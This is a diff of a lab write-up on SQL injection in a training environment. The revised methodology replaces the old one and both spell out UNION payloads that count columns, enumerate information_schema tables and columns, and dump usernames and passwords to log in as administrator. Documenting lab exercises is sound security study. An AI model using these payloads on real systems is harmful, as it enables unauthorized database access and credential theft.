@@ -17,17 +17,18 @@ The applications product category filter builds its SQL query by directly concat
 Because user input is placed inside the query, an attacker can use a UNION attack not only to retrieve data from known tables, but also to query the databases information schema, which lists every table and column that have. This lets an attacker discover and extract data from tables they were never meant to access.
 
 # Methodology
-1. Opened the lab and clicked a category filter called Gifts. The URL became "/filter?category=Gifts".
-2. Using "ORDER BY" technique determined that the query returns 2 columns using payload "UNION SELECT 'a','a'--".
-3. Queried the "information_schema.tables" to view the list of all the table names in the database 
- "/filter?category=Gifts’+UNION+SELECT+table_name,NULL+FROM+information_schema.tables--"
-4. Identified a non standard table name in the results, "users_<xxxx>" the lab generates a randomized suffix, which stood out from expected application tables like "products".
-5. Queried "information_schema.columns", filtered to that table, to list its column names 
- "/filter?category=Gifts’+UNION+SELECT+column_name,NULL+FROM+information_schema.columns+WHERE+table_name='users_xxxx'--"
-6. Found two relevant columns, "username_<xxxxx>" and "password_<xxxxx>".
-7. Queried the table directly, concatenating both columns into a single output column so both values displayed within the applications 2 columns layout 
- "/filter?category=Gifts’+UNION+SELECT+username_xxxx,password_xxxx+FROM+users_xxxx--".
-8. The page displayed the "administrator" username alongside their password. Used these credentials to log in as "administrator", and the lab was marked as solved.
+1. Accessed the lab and navigated to the Gifts page. Tested the category parameter with a single quote (') to confirm the injection point.
+2. Determined the number of columns using ORDER BY:
+- 'ORDER BY 1--  → 200 OK
+- 'ORDER BY 2--  → 200 OK
+- 'ORDER BY 3--  → Internal server error → confirms the query returns exactly 2 columns.
+3. Listed all tables in the database:
+- 'UNION SELECT table_name,NULL FROM information_schema.tables--  → revealed the full table list and confirmed the database is PostgreSQL. Identified a table named users_<xxxx> as the target.
+4. Listed the columns of that table:
+   'UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users_<random>'-- → revealed columns username_<random> and password_<random>.
+5. Extracted the actual credentials:
+   'UNION SELECT username_<xxxx>,password_<xxxx> FROM users_<random>-- → returned all usernames and passwords, including the administrator's.
+6. Logged in as administrator using the extracted password, and you see the lab was marked as solved.
 
 # Evidence
 ![UNION SELECT payload querying information_schema](images/lab-05-payload.png)
